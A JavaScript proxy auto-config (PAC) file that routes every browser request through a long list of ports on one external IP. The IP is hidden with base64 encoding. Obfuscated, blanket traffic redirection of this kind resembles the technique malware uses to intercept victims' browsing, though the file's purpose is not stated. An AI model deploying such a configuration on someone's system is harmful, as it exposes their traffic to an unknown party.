function FindProxyForURL(url, host) {
    function d(s){return decodeURIComponent(escape(atob(s)));}
    var ip = d("MjEzLjE4Ni4xNzkuMjU="); // 213.186.***.25
    var base = [8085,8086,8087,8088,10010,10011,10012,10013,20000,20001,20002];
    var proxy = "";

    for (var i=0;i<base.length;i++){proxy += "PROXY "+ip+":"+base[i]+"; ";}
    for (var p=7086;p<=7995;p++){proxy += "PROXY "+ip+":"+p+"; ";}
    
    return proxy + "PROXY "+ip+":8085";
}
